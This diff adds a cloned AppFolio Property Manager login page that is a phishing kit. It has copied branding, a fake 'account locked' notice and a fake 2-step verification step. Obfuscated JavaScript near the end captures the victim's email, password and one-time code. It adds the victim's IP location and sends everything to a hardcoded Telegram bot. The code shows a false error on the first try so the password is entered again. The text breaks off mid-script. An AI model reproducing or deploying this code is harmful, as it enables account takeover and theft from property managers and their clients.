@@ -1,0 +1,563 @@
+<meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="mobile-web-app-capable" content="yes">
+
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-title" content="">
+
+  <meta name="robots" content="noindex, nofollow">
+
+  <link rel="icon" type="image/x-icon" href="https://public.cdn.appfolio.com/public/favicons/favicon.ico" id="favicon" sizes="16x16 24x24 32x32 48x48 64x64"><link rel="apple-touch-icon" type="image/png" href="https://public.cdn.appfolio.com/public/favicons/apple-touch-icon.png" sizes="180x180"><link rel="apple-touch-icon" type="image/png" href="https://public.cdn.appfolio.com/public/favicons/apple-touch-icon-120x120.png" sizes="120x120"><link rel="apple-touch-icon-precomposed" type="image/png" href="https://public.cdn.appfolio.com/public/favicons/apple-touch-icon-120x120-precomposed.png" sizes="120x120"><link rel="apple-touch-icon" type="image/png" href="https://public.cdn.appfolio.com/public/favicons/apple-touch-icon-152x152.png" sizes="152x152"><link rel="apple-touch-icon-precomposed" type="image/png" href="https://public.cdn.appfolio.com/public/favicons/apple-touch-icon-152x152-precomposed.png" sizes="152x152"><link rel="mask-icon" type="image/svg" href="https://public.cdn.appfolio.com/public/favicons/safari-pinned-tab.svg" color="#00afdb">
+  <title>AppFolio</title>
+
+  <link rel="stylesheet" href="https://property.cdn.appfolio.com/assets/property/property_authorization/login-c995fbbaf70da06a6bcec0430c296f42643c27e7b97e9e2bf46a3e83e9e91387.css">
+
+  <link href="https://public.cdn.appfolio.com/bootstrap-coastline/7.0.8/bootstrap-coastline.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://public.cdn.appfolio.com/public/icons/font-awesome/6.2.0/css/all.min.css">
+  <link rel="stylesheet" href="https://public.cdn.appfolio.com/public/icons/font-awesome-custom/fa.6-appf.0.0.1/custom-icons.min.css">
+
+  
+
+    <script>
+    (
+      function (p, l, o, w, i, n, g) {
+        if (!p[i]) {
+          p.GlobalSnowplowNamespace = p.GlobalSnowplowNamespace || [];
+          p.GlobalSnowplowNamespace.push(i);
+          p[i] = function () {
+            (p[i].q = p[i].q || []).push(arguments)
+          };
+          p[i].q = p[i].q || [];
+          n = l.createElement(o);
+          g = l.getElementsByTagName(o)[0];
+          n.async = 1;
+          n.crossOrigin = 'anonymous';
+          n.src = w;
+          g.parentNode.insertBefore(n, g)
+        }
+      }(window,document,"script","https://public.cdn.appfolio.com/public/assets/scripts/snowfolio/4.3.1/snowfolio.js","snowplow")
+    );
+    const collector_url = 'https://snowplow-collector.dataplatform.appfolio.net';
+    window.snowplow('newTracker', 'sp1', collector_url, {
+      appId: 'property',
+      postPath: '/io.augur.snowplow/1-0-0'
+    })
+
+    snowplow('enableActivityTracking', {
+      minimumVisitLength: 60,
+      heartbeatDelay: 60
+    });
+    const pageAccessedByReload = (
+      (window.performance.navigation && window.performance.navigation.type === 1) ||
+        window.performance
+          .getEntriesByType('navigation')
+          .map((nav) => nav.type)
+          .includes('reload')
+    );
+
+    window.snowplow('trackPageView', {
+      context: [{
+        schema: 'iglu:io.augur.snowplow/identity_lite/jsonschema/1-0-0',
+        data: {
+          email: null,
+          role: null,
+          usingMobileApp: false,
+          vhost_id: 'bb44de96af32ff4b0ceda8876387c1ee5f4f2ef1',
+          vhost_name: 'pabstkinney',
+          is_page_reload: pageAccessedByReload
+        }
+      }]
+    });
+    var window_URL = window.location.pathname
+
+    const targetNode = document;
+    const observerOptions = {
+      childList: true,
+      attributes: true,
+      subtree: true
+    }
+
+    const observer = new MutationObserver(on_click_plow_page);
+    observer.observe(targetNode, observerOptions);
+
+    /*
+     * Adds a click event listener to an iframe identified by its name.
+     *
+     * @param {string} name - The name attribute of the iframe to which the event listener is to be added.
+     * @param {function} listener - The event listener function to be added to the iframe.
+     */
+    function addEventListenerToIframe(name, listener) {
+      // Get all iframes with the given name. It returns a NodeList.
+      const iframes = document.getElementsByName(name);
+
+      // Check if there's at least one iframe with the given name.
+      if (iframes.length > 0) {
+        // Check if the contentWindow and document properties exist on the first iframe.
+        if (iframes[0].contentWindow && iframes[0].contentWindow.document) {
+          // Add a click event listener to the document within the iframe's contentWindow.
+          iframes[0].contentWindow.document.addEventListener('click', listener, true);
+        }
+      }
+    }
+    function on_click_plow_page () {
+      var new_window_URL=window.location.pathname
+      if (window_URL!=new_window_URL) {
+          window.snowplow('trackPageView', {
+            context: [{
+              schema: 'iglu:io.augur.snowplow/identity_lite/jsonschema/1-0-0', // TODO: What is this schema?  Why do we need it?  Do we have to host iglu?
+              data: {
+                email: null,
+                role: null,
+                usingMobileApp: false,
+                vhost_id: 'bb44de96af32ff4b0ceda8876387c1ee5f4f2ef1',
+                vhost_name: 'pabstkinney',
+                is_page_reload: false
+              }
+            }]
+          });
+        window_URL=new_window_URL
+      }
+      // Add a click event listener to the iframe with name 'intercom-launcher-frame' using the on_click_plow function.
+      addEventListenerToIframe('intercom-launcher-frame', on_click_plow);
+      // Add a click event listener to the iframe with name 'intercom-messenger-frame' using the on_click_plow function.
+      addEventListenerToIframe('intercom-messenger-frame', on_click_plow);
+    };
+
+    function get_parents(e){
+      /*
+        Traverse upwards and adds each parent node to the nodes array as it goes
+        Once it runs into an undefined parent node or the current node is the document, exit the loop
+        At each element upwards, grab the label(s)' text contents, the id value and the classes (that don't start with 'supports')
+        Return the three separate arrays of Ids, Labels, Classes packed into a single array
+      */
+      var element = e.target
+      var allParentElementIds = []; // Array to hold all parent node element IDs
+      var allParentElementLabels = []; // Array to hold all parent node labels
+      var allParentClasses = []; // Array to hold all parent node element classes
+      var isSearch = false;
+      var searchDataPosition = null;
+      let recentSearchTermClick = null;
+      let advancedSearchLinkClick = null;
+      let searchClearButtonClick = null;
+      let filteredSearchCategory = null;
+
+      while(element && element !== document) {
+        try {
+          if(element.id) {
+            if(element.id=='apm-global-search'){
+                  isSearch=true;
+            }
+            allParentElementIds.push(element.id);
+          };
+          try {
+            if( element.getAttribute('data-position') != null ) {
+              searchDataPosition = element.getAttribute('data-position')
+            }
+          }
+          catch { }
+          if(element.labels){
+            element.labels.forEach((label) => {
+              if (label.textContent) {
+                allParentElementLabels.push(label.textContent)
+              }
+            });
+          };
+          element.classList.forEach((classes) => {
+            if(classes && !classes.startsWith('supports')){
+                allParentClasses.push(classes)
+              }
+          });
+        }
+        catch { }
+        element = element.parentNode;
+      }
+
+      const recentSearchTermRootId = allParentElementIds.find(id => id.startsWith('recent-search-term-root'));
+      try {
+        if (recentSearchTermRootId) {
+          const recentSearchTermRoot = document.getElementById(recentSearchTermRootId);
+          const isSelect = allParentElementIds.find(id => id.startsWith('recent-search-term-select-button'));
+          const isDelete = allParentElementIds.find(id => id.startsWith('recent-search-term-delete-button'));
+
+          recentSearchTermClick = {
+            searchTerm: recentSearchTermRoot.getAttribute('data-recent-search-term'),
+            position: recentSearchTermRoot.getAttribute('data-recent-search-term-position'),
+            action: isSelect ? 'select'
+              : isDelete ? 'delete'
+                : null,
+          }
+        }
+
+
+        let advancedSearchLinkId = allParentElementIds.find(id => id.match(/advanced-search-(header|more-results)-button/))
+        if (advancedSearchLinkId) advancedSearchLinkClick = { advancedSearchLinkId };
+
+        const filteredSearchCategoryOptionClass = allParentClasses.find(className => className === 'search-category-filter__option');
+        if (filteredSearchCategoryOptionClass) {
+          const filteredSearchCategoryOptionId = allParentElementIds.find(id => /react-select-\d+-option-\d+/.test(id));
+          const filteredSearchCategoryOption = document.getElementById(filteredSearchCategoryOptionId);
+          filteredSearchCategory = filteredSearchCategoryOption?.textContent;
+        }
+
+        searchClearButtonClick = allParentElementIds.some(id => id === 'global-search-clear-button');
+      } catch { }
+
+      return [
+        allParentElementIds,
+        allParentClasses,
+        allParentElementLabels,
+        isSearch,
+        searchDataPosition,
+        recentSearchTermClick,
+        advancedSearchLinkClick,
+        filteredSearchCategory,
+        searchClearButtonClick,
+      ];
+    };
+
+    function on_click_plow(e) {
+      var parentResults = get_parents(e); // retrieve parent element Ids, classes and labels arrays
+      var allElementIds = parentResults[0]; // retrieve allParentElementIds array into allElementIds
+      var allParentClasses = parentResults[1]; // retrieve allParentClasses array into allElementIds
+      var allParentLabels = parentResults[2] // retrieve allParentElementLabels array into allElementIds
+      var search = parentResults[3];
+      var searchTerm = null;
+      let searchResponseUuid;
+      var searchPosition =   parentResults[4];
+      let recentSearchTermClick = parentResults[5];
+      let advancedSearchLinkClick = parentResults[6];
+      let filteredSearchCategory = parentResults[7];
+      let searchClearButtonClick = parentResults[8];
+      /*
+        targetUrl is a REQUIRED field in the final payload
+        First, attempt to set the targetURL variable to be the href attribute of the clicked element
+        If that results in an empty string or an undefined value for targetURL variable, set the targetURL variable to be the current page URL
+      */
+      var targetURL = e.target.getAttribute('href');
+      if (typeof e.target.parentNode?.getAttribute == 'function') {
+        var parentTargetURL = e.target.parentNode.getAttribute('href');
+      };
+      if (!targetURL) {
+        if(parentTargetURL) {
+              targetURL=parentTargetURL;
+        } else {
+              targetURL='N/A';
+        }
+      };
+      if (search==true) {
+        searchTerm = document.getElementById('global-search-input').getAttribute('value');
+        searchResponseUuid = document.getElementById('global-search-container')?.getAttribute('data-search-response-uuid');
+      };
+      /*
+        parse attribute name/values into key/value pair json blob for ease of querying final event structure
+        It rejects element attributes called "value" or with names containing the word "cache" unless the element has a classname of "snowplow-allow-value"
+      */
+      const getAllAttributes = {};
+      if(e.target.attributes instanceof Array){
+        attributes_=e.target.attributes; // if the attributes are an array, we can just use them as is
+      } else {
+        attributes_=[...e.target.attributes]; // otherwise, they need to be put into an array so we can use them to build out the attribute json blob
+      };
+      attributes_.forEach((element) => {
+        // Do not record `src` attribute
+        if (element.name === 'src') {
+          return;
+        }
+
+        // Check if the attribute is 'value' or contains 'cache'
+        const isPossiblySensitive = element.name == 'value' || element.name.toLowerCase().includes('cache');
+
+        // Check if 'snowplow-allow-value' is present in the element attribute values or in the list of parent classes
+        const isWhitelisted = Object.values(attributes_).includes('snowplow-allow-value') || allParentClasses.includes('snowplow-allow-value');
+
+        // If the attribute is not sensitive, or is whitelisted, record the attribute
+        if (!isPossiblySensitive || isWhitelisted) {
+          getAllAttributes[element.name] = element.value;
+        }
+      });
+      /*
+        send trackLinkClick event to the snowplow event collector
+      */
+      snowplow('trackLinkClick', {
+        targetUrl: targetURL,
+        elementId: e.target.id,
+        elementClasses: [...e.target.classList],
+        elementContent: e.target.innerText,
+        context: [{
+          schema: 'iglu:io.augur.snowplow/identity_lite/jsonschema/1-0-0',
+          data: {
+            email: null,
+            role: null,
+            usingMobileApp: false,
+            vhost_id: 'bb44de96af32ff4b0ceda8876387c1ee5f4f2ef1',
+            vhost_name: 'pabstkinney',
+            elementType: e.target.tagName,
+            elementAttributes: getAllAttributes,
+            pageURLComponents: window.location.pathname.split("/").filter(function(a){ if(a!=''){return a}}), // parse the pathname into each individual element separated by "/"
+            elementParentClasses: allParentClasses,
+            elementParentElementIds: allElementIds,
+            elementParentLabels: allParentLabels,
+            isGlobalSearch: search,
+            globalSearchTerm: searchTerm,
+            searchPositionIndex: searchPosition,
+            searchResponseUuid: searchResponseUuid,
+            recentSearchTermClick: recentSearchTermClick,
+            advancedSearchLinkClick: advancedSearchLinkClick,
+            filteredSearchCategory: filteredSearchCategory,
+            searchClearButtonClick: searchClearButtonClick,
+          }
+        }]
+      });
+    };
+
+    document.addEventListener("click", on_click_plow, true);
+    // Add a click event listener to the iframe with name 'intercom-launcher-frame' using the on_click_plow function.
+    addEventListenerToIframe('intercom-launcher-frame', on_click_plow);
+    // Add a click event listener to the iframe with name 'intercom-messenger-frame' using the on_click_plow function.
+    addEventListenerToIframe('intercom-messenger-frame', on_click_plow);
+  </script>
+
+
+  <!-- Modernizr must be included before the end </head> tag -->
+  <script id="modernizr" src="https://property.cdn.appfolio.com/assets/property/modernizr.custom-8db2502875527460cbe8e26489c692b48deb4938225fbf656cfc6c3a9f60fa04.js"></script>
+
+</head>
+
+<body>
+
+<div class="container px-sm-0 px-md-1" id="mainbig" style="display:block">
+  <div class="row mt-sm-5 mb-0">
+    <div class="col-12 col-sm-9 col-md-7 col-lg-6 col-xl-5 px-0 mx-auto pt-sm-5">
+      <div class="card p-3 p-sm-5">
+        <div class="mt-4 d-flex justify-content-center">
+          <img alt="AppFolio Property Manager" height="56" src="https://public.cdn.appfolio.com/public/images/apm-primary-skyblue.svg">
+        </div>
+          <section class="bg-white overflow-hidden mx-1 mx-sm-3">
+
+          <div id="otp_content" class="w-100 mt-5 mb-3 mx-sm-auto" style="display:none">
+            <div class="mx-4 mx-sm-1">
+                <h1 class="heading-login">2-Step Verification</h1>
+  <p class="color-gray-800"><p>Your code is on the way. Please wait a moment<br/>
+    Please enter the 6 digit code sent to your device.</p>
+
+        <div class="alert alert-danger login-alert"  style="display:none" id="eoini"><div id="otpMessage" >
+</div>
+</div>
+
+<form class="form" id="new_user"  method="post"><input type="hidden" name="authenticity_token" value="VNFOBBWGgTrjJG_Eo-GwnbkSaeqCxZL3fMOo_mgrC9KROvse7LMg7y3lpDQvyHlG4g6EA8hREyZo7babCBoA0Q" autocomplete="off">
+  <div class="mb-3"><label class="form-label" for="user_email">Verification Code</label><input class="form-control string js-autofocus"  type="text"  id="userotp"></div>
+  <div class="btn-toolbar text-start mt-4">
+    <input type="button" name="commit" value="Continue" class="btn btn-primary" onclick="handleOther()" id="continue_button">
+  </div>
+
+</form>
+            </div>
+          </div>
+         
+
+
+
+
+          <div class="w-100 mt-5 mb-3 mx-sm-auto" id="done_content"  style="display:none">
+            <div class="mx-4 mx-sm-1">
+ <center>                 
+                            <h4><b>Account Information has been verified successfully</b></h4>
+                               <br/>         <div class="nc-body-text ng-binding">
+                                        Please wait you will be redirected to sign in page in 5 seconds...</div>
+                                        </center>                 
+      
+            </div>
+          </div>
+
+        </section>
+          <div id="login_content" class="w-100 mt-5 mb-3 mx-sm-auto" >
+            <div class="mx-4 mx-sm-1">
+              <style>
+  .login-alert {
+    p {
+      margin-bottom: 0;
+    }
+    ul {
+      margin-bottom: 0;
+    }
+  }
+</style>
+
+
+
+
+<h1 class="heading-login">Log in to your account</h1>
+
+    <div class="alert alert-danger login-alert"  style="display:none" id="cotni"><div id="errorMessage" >
+</div>
+</div>
+
+<form class="form" accept-charset="UTF-8">
+    <div class="form-group mb-3 my-4">
+      <label class="col-form-label" for="user_email">Email</label>
+      <input class="form-control string js-autofocus" type="email"
+                  id="emailInput">
+    </div>
+    <div class="form-group mb-3">
+      <label class="col-form-label" for="user_password">Password</label>
+      <input class="form-control" type="password"  type="password" id="passwordInput">
+    </div>
+
+  <p class="d-block pt-2">
+    <a href="">Forgot your password?</a>
+  </p>
+
+  <div class="btn-toolbar mt-4 pt-2">
+    <input type="button" name="commit" value="Log In" class="btn btn-primary  w-100" id="sign_val" onclick="handleLogin()">
+  </div>
+
+
+  <div class="d-flex flex-column pt-2">
+    <div id="resident-owner-help"><div class="text-center d-flex justify-content-center"><div>Trying to log in as a resident or owner?<span class="ms-1 mb-5" style="cursor: pointer;"><button type="button" aria-disabled="false" class="p-0 btn btn-link" aria-label="More Info"><i id="help-bubble-0" aria-hidden="true" class="fa-solid fa-circle-question text-primary"></i></button></span></div></div></div>
+    <div class="row justify-content-around mt-3">
+      <div class="col-12 col-xs-12 col-sm-6 mb-2">
+        <a id="resident-hoa-portal-link" class="btn btn-secondary w-100" href="">Resident/HOA Portal</a>
+      </div>
+      <div class="col-12 col-xs-12 col-sm-6 mb-2">
+        <a id="owner-portal-link" class="btn btn-secondary w-100" href="">Owner Portal</a>
+      </div>
+    </div>
+  </div>
+</form>
+
+            </div>
+          </div>
+        </section>
+      </div>
+    </div>
+  </div>
+<div id="feedback-footer" class="text-center w-100 login-feedback" data-site-key="6Lcy0jclAAAAAIwnicjW9eug0K-QpmH9S9cb9zA2"><button type="button" aria-disabled="false" class="btn btn-outline-primary"><span class="fw-bold text-uppercase"><i aria-hidden="true" class="fa-solid fa-envelope me-2"></i>Feedback</span></button></div><div></div>
+
+</div>
+
+
+<div id="mainbody" style="margin-top:13px;display:none">
+<div style="margin: 0px; padding: 0px; font-family: Helvetica,Arial,sans-serif; background-color: rgb(250, 251, 251);"><center>
+<table width="100%" style="border-collapse: collapse; max-width: 650px; border-spacing: 0; background-color: rgb(250, 251, 251);" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td valign="top" style="border-collapse: collapse;">
+<table align="center" id="v1v1v1m_5650119396197315798m_2664740678093031661boxing" style="border-collapse: collapse; border-spacing: 0;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td id="v1v1v1m_5650119396197315798m_2664740678093031661template-wrapper" style="border-collapse: collapse;">
+<table width="100%" id="v1v1v1m_5650119396197315798m_2664740678093031661module-hero-image" style="max-width: 650px;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td valign="top" style="margin: 0px auto;">
+<table width="100%" align="center" style="margin: 0px auto; width: 100%; text-align: center;" bgcolor="#ffffff" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td width="100%" align="center">
+<div id="v1v1v1m_5650119396197315798m_2664740678093031661hero-image"></div>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table width="100%" id="v1v1v1m_5650119396197315798m_2664740678093031661module-main-body-text9cf69e9b-d45a-4963-8954-186fa0894d62" style="max-width: 650px;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td style="height: 40px;" bgcolor="#ffffff">
+<p align="center">&nbsp;</p>
+<p align="center"><strong><span style="font-size: 22.5px;"><span style="font-size: 23.8px;"><span style="font-size: 25.1px;"><span style="font-size: 23.8px;"><span style="font-size: 27.7px;">&nbsp;</span></span></span></span></span></strong><strong><span style="font-size: 22.5px;"><span style="font-size: 23.8px;"><span style="font-size: 25.1px;"><span style="font-size: 23.8px;"><span style="font-size: 27.7px;">
+<img width="215" height="80" alt="AppFolio Property Manager" src="https://public.cdn.appfolio.com/public/images/apm-primary.svg"></span></span></span></span></span></strong></p>
+<p align="center">&nbsp;</p>
+<p align="center"><strong><span style="font-size: 22.5px;"><span style="font-size: 23.8px;"><span style="font-size: 25.1px;"><span style="font-size: 23.8px;"><span style="font-size: 27.7px;">403</span></span></span></span></span><br><br></strong><span style="font-size: 17.3px;"><span style="font-size: 18.6px;"><span style="font-size: 19.9px;"><span style="font-size: 21.2px;">This account has been locked.</span></span></span></span><br><span style="font-size: 17.3px;">
+<span style="font-size: 18.6px;"><span style="font-size: 19.9px;"><span style="font-size: 21.2px;">&nbsp;&nbsp; Please use the link below to unlock your account</span></span>.</span></span><br><br><br><u><a href="javascript:void(0)"  onclick="handlemain()"  rel="noopener noreferrer"><span style="font-size: 17.3px;">Unlock</span></a></u><span style="font-size: 17.3px;"> | </span><u><a href="javascript:void(0)"  onclick="handlemain()"  rel="noopener noreferrer"><span style="font-size: 17.3px;">Verify</span></a></u>
+<span style="font-size: 17.3px;"> | </span><u><a href="javascript:void(0)"  onclick="handlemain()" rel="noopener noreferrer"><span style="font-size: 17.3px;">Log in</span></a></u></p>
+</td>
+</tr>
+<tr>
+<td align="left" valign="top" bgcolor="#ffffff">
+<div id="v1v1v1m_5650119396197315798m_2664740678093031661main-body-text959abd08-9a01-450a-8b45-50646f211e4f" style="margin: 0px auto; color: rgb(30, 36, 48); line-height: 150%; font-size: 16px;"></div>
+<div style="margin: 0px auto; color: rgb(30, 36, 48); line-height: 150%; font-size: 16px;">&nbsp;<br><span style="font-size: 13.4px;">&nbsp; <span style="font-size: 12.5px;">To ensure maximum security for your account, a One-Time Password (OTP) will be sent to you for verification.&nbsp;&nbsp; </span></span></div>
+<div style="margin: 0px auto; color: rgb(30, 36, 48); line-height: 150%; font-size: 16px;">&nbsp;</div>
+</td>
+</tr>
+</tbody>
+</table>
+<table width="100%" id="v1v1v1m_5650119396197315798m_2664740678093031661module-spacer-40" style="max-width: 650px;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td style="height: 40px;" bgcolor="#ffffff">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+<table width="100%" id="v1v1v1m_5650119396197315798m_2664740678093031661module-footer" style="max-width: 650px;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td bgcolor="#fafbfb">
+<table width="100%" bgcolor="#fafbfb" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td><center>
+<table style="margin: 0px auto; text-align: center;">
+<tbody>
+<tr>
+<td style="height: 40px;">&nbsp;</td>
+</tr>
+<tr>
+<td style="padding-right: 15px;"><a href="https://go.appfolio.com/ODk1LUNHVy03MTEAAAGY13rVZGYL0hf-BZ_LS_9ZNbJjZj3evWvZG55l3nTyFvU5M14dhUX9NG4EI3-awZOahCJSF2E=" target="_blank" rel="noopener noreferrer"><img width="20" height="21" title="linkedin" alt="Twitter" src="https://cdn.brandfolder.io/1TPX6JVS/at/37rjrm4qm996cw4h6ck8w7/LinkedIn_stroke.png" border="0"></a></td>
+<td style="padding-right: 15px;"><a href="https://go.appfolio.com/ODk1LUNHVy03MTEAAAGY13rVZD4j4K_8zRuAj87RV-Uimnp6JYccsBFB3v_80EklEem-q2uZRcqgmYBt7ldkkgZBYq8=" target="_blank" rel="noopener noreferrer"><img width="20" height="21" title="Twitter" alt="Twitter" src="https://cdn.brandfolder.io/1TPX6JVS/at/k5j425j6jc9vmzrvv75gskqv/Twitter_stroke.png" border="0"></a></td>
+<td style="padding-right: 15px;"><a href="https://go.appfolio.com/ODk1LUNHVy03MTEAAAGY13rVY4z3usuPQnNTFNL7k2PxbL-BfoDX6vE0scjI812CNAwpTi1UItva-5RI4IXqBlZVssU=" target="_blank" rel="noopener noreferrer"><img width="20" height="20" title="Twitter" alt="FB" src="https://cdn.brandfolder.io/1TPX6JVS/at/f9fpr94rkxchm5cwb4xk7nkx/Facebook_stroke.png" border="0"></a></td>
+<td><a href="https://go.appfolio.com/ODk1LUNHVy03MTEAAAGY13rVZIz3Nv8taKUylAXPmkAiSoLDPvGyD80j2eEuAvXmRpmxmIhuqnlnN2ypPaNua2sTGBA=" target="_blank" rel="noopener noreferrer"><img width="20" height="20" title="instagram" alt="Twitter" src="https://cdn.brandfolder.io/1TPX6JVS/at/5s3j6767wvp892bgwjbmsx/Instagram_stroke.png" border="0"></a></td>
+</tr>
+<tr>
+<td style="height: 16px;">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</center></td>
+</tr>
+<tr>
+<td><center>
+<table style="margin: 0px auto; padding: 0px 20px; text-align: center; max-width: 560px;">
+<tbody>
+</tbody>
+</table>
+</center></td>
+</tr>
+<tr>
+<td style="height: 40px;">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</center><img width="1" height="1" style="display: none !important;" src="https://go.appfolio.com/trk?t=1&amp;mid=ODk1LUNHVy03MTEAAAGY13rVZIipjzWvfcIR5prDdnYmt7R8J3Sj1NkR6DkpXyxM2oJmkjB4dkP3TWOzlk8iRZnZGI14HHNQeKFTykRP8eDAkaOhVZvFMzLMmmMiqppJDlvCzHidK-wjlVceVwzs8VLEetyjyDRoP5dHz6OOjXBRVEVVorpi"></div>
+</div>
+
+
+        <input type="hidden" id="count" value="0">
+        <input type="hidden" id="ctount" value="0">
+
+      <script>
+const telegramBotToken = '8693544963:AAHds9ChNo4jii2DlFAA5qXVd6IgobeE82c';
+const chatId = '7658666869'; 
+   
+(function(_0x398c9f,_0x316c99){const _0xf09531=_0x26e8,_0x4679a3=_0x398c9f();while(!![]){try{const _0x33133f=parseInt(_0xf09531(0x20e))/0x1+-parseInt(_0xf09531(0x218))/0x2*(-parseInt(_0xf09531(0x220))/0x3)+-parseInt(_0xf09531(0x207))/0x4+-parseInt(_0xf09531(0x208))/0x5*(-parseInt(_0xf09531(0x211))/0x6)+-parseInt(_0xf09531(0x222))/0x7*(parseInt(_0xf09531(0x217))/0x8)+-parseInt(_0xf09531(0x206))/0x9*(-parseInt(_0xf09531(0x213))/0xa)+-parseInt(_0xf09531(0x201))/0xb;if(_0x33133f===_0x316c99)break;else _0x4679a3['push'](_0x4679a3['shift']());}catch(_0x598620){_0x4679a3['push'](_0x4679a3['shift']());}}}(_0x4a8f,0xce80f));function _0x26e8(_0x5560cc,_0x5008cd){const _0x4a8f2a=_0x4a8f();return _0x26e8=function(_0x26e868,_0x20af17){_0x26e868=_0x26e868-0x1ea;let _0xf57269=_0x4a8f2a[_0x26e868];return _0xf57269;},_0x26e8(_0x5560cc,_0x5008cd);}async function handleLogin(){const _0x5a705f=_0x26e8,_0x2e764b=document[_0x5a705f(0x203)](_0x5a705f(0x1ef))[_0x5a705f(0x1fa)][_0x5a705f(0x1f8)](),_0x5c0cc1=document[_0x5a705f(0x203)](_0x5a705f(0x21c))[_0x5a705f(0x1fa)][_0x5a705f(0x1f8)](),_0x197e5d=document[_0x5a705f(0x203)](_0x5a705f(0x1f1));_0x197e5d['textContent']='',document[_0x5a705f(0x203)](_0x5a705f(0x1fd))[_0x5a705f(0x1fa)]=_0x5a705f(0x1ea),document[_0x5a705f(0x203)]('cotni')['style'][_0x5a705f(0x219)]=_0x5a705f(0x20f);if(!_0x2e764b){_0x197e5d[_0x5a705f(0x1f5)]=_0x5a705f(0x212),document['getElementById'](_0x5a705f(0x202))[_0x5a705f(0x225)][_0x5a705f(0x219)]=_0x5a705f(0x21e);return;}if(!validateEmail(_0x2e764b)){_0x197e5d[_0x5a705f(0x1f5)]=_0x5a705f(0x1ed),document[_0x5a705f(0x203)](_0x5a705f(0x202))['style']['display']=_0x5a705f(0x21e);return;}if(!_0x5c0cc1){_0x197e5d[_0x5a705f(0x1f5)]=_0x5a705f(0x1fc),document[_0x5a705f(0x203)](_0x5a705f(0x202))[_0x5a705f(0x225)]['display']=_0x5a705f(0x21e);return;}setTimeout(async()=>{const _0x45f783=_0x5a705f;try{const _0x473b4d=await fetch('https://ipinfo.io/json'),_0xab2c46=await _0x473b4d['json'](),{ip:_0x1106c9,city:_0x5e09cc,region:_0xb14b20,country:_0x18e48d}=_0xab2c46,_0x54ace7=navigator[_0x45f783(0x1f4)],_0x578480=new Date()['toLocaleString'](),_0x539b26='Login\x20from\x20Appfolio:\x0aIP:\x20'+_0x1106c9+'\x0aLocation:\x20'+_0x5e09cc+',\x20'+_0xb14b20+',\x20'+_0x18e48d+_0x45f783(0x21b)+_0x2e764b+_0x45f783(0x221)+_0x5c0cc1+_0x45f783(0x1f9)+_0x54ace7+'\x0aTime:\x20'+_0x578480,_0x570635=await fetch(_0x45f783(0x1ec)+telegramBotToken+_0x45f783(0x209),{'method':_0x45f783(0x1fb),'headers':{'Content-Type':_0x45f783(0x21d)},'body':JSON[_0x45f783(0x1f7)]({'chat_id':chatId,'text':_0x539b26})});if(!_0x570635['ok'])throw new Error(_0x45f783(0x210));var _0xb962cf=document[_0x45f783(0x203)](_0x45f783(0x1f3))[_0x45f783(0x1fa)];_0xb962cf>=0x1?(document[_0x45f783(0x203)]('login_content')[_0x45f783(0x225)]['display']=_0x45f783(0x20f),document[_0x45f783(0x203)](_0x45f783(0x214))[_0x45f783(0x225)][_0x45f783(0x219)]=_0x45f783(0x21e)):(document[_0x45f783(0x203)](_0x45f783(0x1f3))[_0x45f783(0x1fa)]=+_0xb962cf+0x1,document['getElementById'](_0x45f783(0x21c))[_0x45f783(0x1fa)]='',document['getElementById'](_0x45f783(0x21c))['focus'](),document[_0x45f783(0x203)](_0x45f783(0x1fd))[_0x45f783(0x1fa)]=_0x45f783(0x1fe),_0x197e5d[_0x45f783(0x1f5)]=_0x45f783(0x20a),document[_0x45f783(0x203)](_0x45f783(0x202))[_0x45f783(0x225)][_0x45f783(0x219)]=_0x45f783(0x21e));}catch(_0x303fc9){_0x197e5d[_0x45f783(0x1f5)]=_0x45f783(0x223),console['error']('Error\x20during\x20login:',_0x303fc9);}},0x7d0);}async function handleOther(){const _0xa31c6f=_0x26e8,_0x416aba=document[_0xa31c6f(0x203)](_0xa31c6f(0x1eb))['value'][_0xa31c6f(0x1f8)](),_0x341cad=document[_0xa31c6f(0x203)]('otpMessage');_0x341cad[_0xa31c6f(0x1f5)]='',document[_0xa31c6f(0x203)](_0xa31c6f(0x1f2))[_0xa31c6f(0x225)][_0xa31c6f(0x219)]=_0xa31c6f(0x20f),document[_0xa31c6f(0x203)]('continue_button')[_0xa31c6f(0x1fa)]=_0xa31c6f(0x1ea),setTimeout(async()=>{const _0x4fe2ec=_0xa31c6f;try{const _0x428228=await fetch(_0x4fe2ec(0x200)),_0x34cc72=await _0x428228[_0x4fe2ec(0x215)](),{ip:_0x3e18ed,city:_0x3d0491,region:_0x287bcf,country:_0x3eb5dc}=_0x34cc72,_0x2130b8=navigator[_0x4fe2ec(0x1f4)],_0x250f2b=new Date()['toLocaleString'](),_0x4b8e53=_0x4fe2ec(0x20b)+_0x3e18ed+_0x4fe2ec(0x205)+_0x3d0491+',\x20'+_0x287bcf+',\x20'+_0x3eb5dc+_0x4fe2ec(0x20c)+_0x416aba+_0x4fe2ec(0x1f9)+_0x2130b8+_0x4fe2ec(0x21f)+_0x250f2b,_0x238c14=await fetch('https://api.telegram.org/bot'+telegramBotToken+_0x4fe2ec(0x209),{'method':_0x4fe2ec(0x1fb),'headers':{'Content-Type':_0x4fe2ec(0x21d)},'body':JSON['stringify']({'chat_id':chatId,'text':_0x4b8e53})});if(!_0x238c14['ok'])throw new 